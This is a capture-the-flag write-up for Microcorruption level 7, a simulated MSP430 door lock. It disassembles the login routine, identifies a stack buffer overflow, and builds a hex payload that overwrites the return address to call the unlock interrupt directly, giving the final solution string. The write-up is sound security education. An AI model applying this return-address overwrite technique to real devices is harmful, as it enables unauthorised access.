# Introduction
This is the **7th** level in the Microcorruption series.
This is the first level that requires overriding the return address *and* passing arguments to the new function.
# Vulnerability Title
Buffer overflow to override the return address, and to provide an argument to the new function.
# Walkthrough
Looking at `main`, it just calls `login`:
```asm
4438 <main>
4438:  b012 f444      call	#0x44f4 <login>
```
The `login` function has some interesting logic:
```asm
44f4 <login>
44f4:  3150 f0ff      add	#0xfff0, sp
44f8:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15
44fc:  b012 9645      call	#0x4596 <puts>
4500:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504:  b012 9645      call	#0x4596 <puts>
4508:  3e40 3000      mov	#0x30, r14
450c:  0f41           mov	sp, r15
450e:  b012 8645      call	#0x4586 <getsn>
4512:  0f41           mov	sp, r15
4514:  b012 4644      call	#0x4446 <conditional_unlock_door>
4518:  0f93           tst	r15
451a:  0324           jz	$+0x8 <login+0x2e>
451c:  3f40 c544      mov	#0x44c5 "Access granted.", r15
4520:  023c           jmp	$+0x6 <login+0x32>
4522:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
4526:  b012 9645      call	#0x4596 <puts>
452a:  3150 1000      add	#0x10, sp
452e:  3041           ret
```
First, it prompts the user for the password:
```asm
4f8:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15
44fc:  b012 9645      call	#0x4596 <puts>
4500:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504:  b012 9645      call	#0x4596 <puts>
```
Second, it gets the password from the user (reading at most `0x30` bytes into the stack):
```asm
4508:  3e40 3000      mov	#0x30, r14
450c:  0f41           mov	sp, r15
450e:  b012 8645      call	#0x4586 <getsn>
```
Third, it checks the input password *and* unlocks the door if it's correct:
```asm
4512:  0f41           mov	sp, r15
4514:  b012 4644      call	#0x4446 <conditional_unlock_door>
4518:  0f93           tst	r15
451a:  0324           jz	$+0x8 <login+0x2e>
```
Finally, it prints out the decision. Either correct:
```asm
451c:  3f40 c544      mov	#0x44c5 "Access granted.", r15
4520:  023c           jmp	$+0x6 <login+0x32>
```
Or incorrect:
```asm
4522:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
4526:  b012 9645      call	#0x4596 <puts>
```
# Vulnerability
The vulnerability is in the `login` function.
Essentially, it's possible to overflow the password input to override the return address of the function.
Specifically, the program is reading `0x30` bytes of data into the stack, while the return address is only `0x10` bytes away from the starting address of the input.
# Exploit
We can craft a payload that will override the return address, by starting with 16 bytes (for example, 32 `1`'s), and then putting the new return address:
`11111111111111111111111111111111` + `return address`
While we can't jump to `conditional_unlock_door`, because it checks the password before unlocking the door, we can directly jump to the `INT` function, and perform an interrupt that will open the door anyway.
Looking at the given disassembly, the `INT` function is located at address `0x4532`.
We can also see that the interrupt code argument is taken from the stack, exactly 2 bytes after the current stack pointer's location.
From the lock's manual, the interrupt code that unlocks the door is `0x7f`.
Combining all of this, we have:
32 x `1` + `return address` + 4 x `1` + `interrupt code`.
Substituting the return address (flipping it because of little endian) and interrupt code, we have:
`11111111111111111111111111111111324511117f`
# Solution
Hex: `11111111111111111111111111111111324511117f`